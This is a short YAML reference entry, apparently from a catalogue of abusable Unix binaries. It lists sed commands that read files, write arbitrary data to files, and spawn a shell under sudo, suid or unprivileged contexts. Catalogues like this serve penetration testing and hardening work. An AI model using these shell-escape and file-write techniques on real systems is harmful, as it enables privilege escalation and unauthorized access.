---
functions:
  file-read:
  - code: |-
      sed '' /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      sed -n '1e exec /bin/sh 1>&0' /etc/hosts
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
    version: |-
      GNU
  - code: |-
      sed e
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
    tty: false
    version: |-
      GNU
...
